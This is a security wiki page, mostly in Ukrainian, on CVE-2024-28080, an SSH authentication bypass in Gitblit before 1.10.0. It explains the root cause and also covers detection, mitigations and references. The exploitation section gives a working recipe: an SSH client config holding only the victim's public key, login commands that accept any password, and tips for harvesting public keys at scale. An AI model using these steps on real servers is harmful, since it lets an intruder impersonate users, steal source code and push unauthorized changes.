# Gitblit Вбудований обхід автентифікації SSH (CVE-2024-28080)

{{#include ../../banners/hacktricks-training.md}}

## Коротко

CVE-2024-28080 — це обхід автентифікації у вбудованому SSH-сервісі Gitblit через некоректне оброблення стану сесії при інтеграції з Apache MINA SSHD. Якщо обліковий запис користувача має принаймні один зареєстрований публічний SSH-ключ, атакувальник, який знає ім'я користувача та будь-який з його публічних ключів, може аутентифікуватися без приватного ключа і без пароля.

- Вразливі: Gitblit < 1.10.0 (спостерігалося на 1.9.3)
- Виправлено: 1.10.0
- Умови для експлуатації:
  - Git over SSH ввімкнено на інстанції
  - Обліковий запис жертви має принаймні один зареєстрований публічний SSH-ключ у Gitblit
  - Атакувальник знає ім'я користувача жертви та один з його публічних ключів (часто доступний, наприклад, https://github.com/<username>.keys)

## Коренева причина (state leaks between SSH methods)

У RFC 4252 public‑key authentication проходить у два етапи: сервер спочатку перевіряє, чи наданий public key прийнятний для username, і лише після challenge/response з підписом аутентифікує користувача. У MINA SSHD PublickeyAuthenticator викликається двічі: при прийнятті ключа (ще без підпису) і пізніше, коли клієнт повертає підпис.

PublickeyAuthenticator у Gitblit мутував контекст сесії під час першого, до-підписного виклику, прив'язавши автентифікований UserModel до сесії та повернувши true ("key acceptable"). Коли автентифікація пізніше відкотилася до пароля, PasswordAuthenticator покладався на цей змінений стан сесії і короткозамикався, повернувши true без перевірки пароля. В результаті будь-який пароль (включно з порожнім) приймався після попередньої public‑key "acceptance" для того ж користувача.

Загальний хибний потік:

1) Клієнт пропонує username + public key (ще немає підпису)  
2) Сервер визнає ключ таким, що належить користувачу, передчасно прив'язує користувача до сесії, повертає true ("acceptable")  
3) Клієнт не може підписати (немає private key), тому автентифікація відкотилася до пароля  
4) Password auth бачить, що користувач вже присутній у сесії, і безумовно повертає успіх

## Покрокова експлуатація

- Зберіть ім'я користувача жертви та один з його public keys:
  - GitHub надає public keys за адресою https://github.com/<username>.keys
  - Публічні сервери часто публікують authorized_keys
- Налаштуйте OpenSSH так, щоб він передавав лише public half, через що генерація підпису зазнає невдачі, примушуючи відкат до пароля, при цьому все ще тригеруючи шлях прийняття public‑key на сервері.

Example SSH client config (no private key available):
```sshconfig
# ~/.ssh/config
Host gitblit-target
HostName <host-or-ip>
User <victim-username>
PubkeyAuthentication yes
PreferredAuthentications publickey,password
IdentitiesOnly yes
IdentityFile ~/.ssh/victim.pub   # public half only (no private key present)
```
Підключіться та натисніть Enter у запиті пароля (або введіть будь-який рядок):
```bash
ssh gitblit-target
# or Git over SSH
GIT_SSH_COMMAND="ssh -F ~/.ssh/config" git ls-remote ssh://<victim-username>@<host>/<repo.git>
```
Authentication succeeds because the earlier public‑key phase mutated the session to an authenticated user, and password auth incorrectly trusts that state.

Note: If ControlMaster multiplexing is enabled in your SSH config, subsequent Git commands may reuse the authenticated connection, increasing impact.

## Impact

- Повне видавання себе за будь‑якого користувача Gitblit, у якого є принаймні один зареєстрований SSH public key
- Read/write access to repositories per victim’s permissions (source exfiltration, unauthorized pushes, supply‑chain risks)
- Можливий адміністративний вплив при цілеспрямованій атакі на admin‑аккаунт
- Pure network exploit; no brute force or private key required

## Detection ideas

- Перегляньте SSH logs на предмет послідовностей, де publickey спроба супроводжується успішною password authentication з порожнім або дуже коротким паролем
- Шукайте потоки: publickey method пропонує неподтримуваний/непідходящий ключ, після чого одразу слідує успішна password authentication для того ж username

## Mitigations

- Upgrade to Gitblit v1.10.0+
- До оновлення:
- Disable Git over SSH on Gitblit, or
- Обмежте мережевий доступ до SSH service, and
- Monitor for suspicious patterns described above
- Змініть/скасуйте облікові дані користувачів, якщо підозрюється compromise

## General: abusing SSH auth method state‑leakage (MINA/OpenSSH‑based services)

Pattern: Якщо public‑key authenticator на сервері мутує стан користувача/сесії під час pre‑signature "key acceptable" фази, і інші authenticators (наприклад, password) довіряють цьому стану, то можна обійти автентифікацію шляхом:

- Presenting a legitimate public key for the target user (no private key)
- Forcing the client to fail signing so the server falls back to password
- Supplying any password while the password authenticator short‑circuits on leaked state

Practical tips:

- Public key harvesting at scale: збирайте public keys з поширених джерел, таких як https://github.com/<username>.keys, organizational directories, team pages, leaked authorized_keys
- Forcing signature failure (client‑side): вкажіть IdentityFile лише на .pub, встановіть IdentitiesOnly yes, залиште PreferredAuthentications так, щоб включав publickey, а потім password
- MINA SSHD integration pitfalls:
- PublickeyAuthenticator.authenticate(...) не повинен прив’язувати стан користувача/сесії до тих пір, поки post‑signature verification шлях не підтвердить підпис
- PasswordAuthenticator.authenticate(...) не повинен робити висновок про успіх на основі будь‑якого стану, зміненого під час попереднього, неповного методу автентифікації

Related protocol/design notes and literature:
- SSH userauth protocol: RFC 4252 (publickey method is a two‑stage process)
- Historical discussions on early acceptance oracles and auth races, e.g., CVE‑2016‑20012 disputes around OpenSSH behavior

## References

- [Gitblit CVE-2024-28080: SSH public‑key fallback to password authentication bypass (Silent Signal blog)](https://blog.silentsignal.eu/2025/06/14/gitblit-cve-CVE-2024-28080/)
- [Gitblit v1.10.0 release notes](https://github.com/gitblit-org/gitblit/releases/tag/v1.10.0)
- [Apache MINA SSHD project](https://mina.apache.org/sshd-project/)
- [PublickeyAuthenticator API](https://svn.apache.org/repos/infra/websites/production/mina/content/sshd-project/apidocs/org/apache/sshd/server/auth/pubkey/PublickeyAuthenticator.html)
- [RFC 4252: The Secure Shell (SSH) Authentication Protocol](https://datatracker.ietf.org/doc/html/rfc4252)


{{#include ../../banners/hacktricks-training.md}}
